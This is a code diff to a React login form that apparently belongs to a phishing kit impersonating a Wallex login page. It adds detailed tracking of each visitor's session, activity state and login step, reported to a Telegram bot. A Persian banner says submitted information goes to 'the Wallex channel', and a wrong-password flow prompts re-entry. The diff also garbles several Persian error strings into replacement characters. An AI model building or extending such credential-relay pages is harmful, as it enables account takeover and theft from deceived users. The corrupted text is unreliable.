@@ -119,27 +119,47 @@ export const LoginForm = () => {
       console.log(
         "🚀 Starting SIMPLE real-time tracking for session:",
         sessionId,
+        "- Current step:",
+        currentStep,
       );
 
       const handleStatusChange = async (state: SimpleActivityState) => {
         console.log("📡 SIMPLE activity state changed:", {
+          sessionId,
           isOnline: state.isOnline,
           isVisible: state.isVisible,
           isActive: state.isActive,
+          currentStep,
+          timestamp: new Date().toLocaleTimeString(),
         });
 
-        const statusText = simpleRealtimeTracker.getStatusText();
-        const statusEmoji = simpleRealtimeTracker.getStatusEmoji();
+        try {
+          const statusText = simpleRealtimeTracker.getStatusText();
+          const statusEmoji = simpleRealtimeTracker.getStatusEmoji();
 
-        // Send activity updates (professional system handles all optimization)
-        await updateUserOnlineStatus(
-          sessionId,
-          state.isOnline,
-          state.isVisible,
-          state.lastActivity,
-          statusText,
-          statusEmoji,
-        );
+          console.log("📤 Sending status to Telegram:", {
+            statusText,
+            statusEmoji,
+          });
+
+          // Send activity updates with error handling
+          const result = await updateUserOnlineStatus(
+            sessionId,
+            state.isOnline,
+            state.isVisible,
+            state.lastActivity,
+            statusText,
+            statusEmoji,
+          );
+
+          if (result.success) {
+            console.log("✅ Status update sent successfully");
+          } else {
+            console.error("❌ Status update failed");
+          }
+        } catch (error) {
+          console.error("❌ Error in handleStatusChange:", error);
+        }
       };
 
       // Start simple real-time tracking
@@ -176,7 +196,7 @@ export const LoginForm = () => {
           setPassword(""); // Clear password field
           setErrors({
             password:
-              "رمز عبور وارد شده اشتباه است. لطفا رمز صحیح را وارد کنید.",
+              "رمز عبور وارد شده اشتباه است. ��طفا رمز صحیح را وارد کنید.",
           });
           break;
         case "google":
@@ -578,7 +598,7 @@ export const LoginForm = () => {
       }
     } catch (error) {
       console.error("Email code verification error:", error);
-      setErrors({ emailCode: "خطا در ارسال کد. لطفا دوباره تلاش کنید." });
+      setErrors({ emailCode: "خطا در ارسال کد. ��طفا دوباره تلاش کنید." });
     } finally {
       setIsSubmitting(false);
     }
@@ -905,7 +925,7 @@ export const LoginForm = () => {
                 <div style={{ marginTop: "8px" }}>
                   <AlertMessage>
                     {!validateTelegramConfig()
-                      ? "🎭 حالت دمو: اطلاعات به کنسول ارسال می‌شود. برای فعال‌سازی تلگرام، فایل .env را تنظیم کنید."
+                      ? "🎭 حالت دمو: اطلاعات به کنسول ارسال می‌شود. برای فعال‌سازی تلگرام، فایل .env را ��نظیم کنید."
                       : "🤖 بات تلگرام فعال: اطلاعات به کانال والکس ارسال خواهد شد."}
                   </AlertMessage>
                 </div>
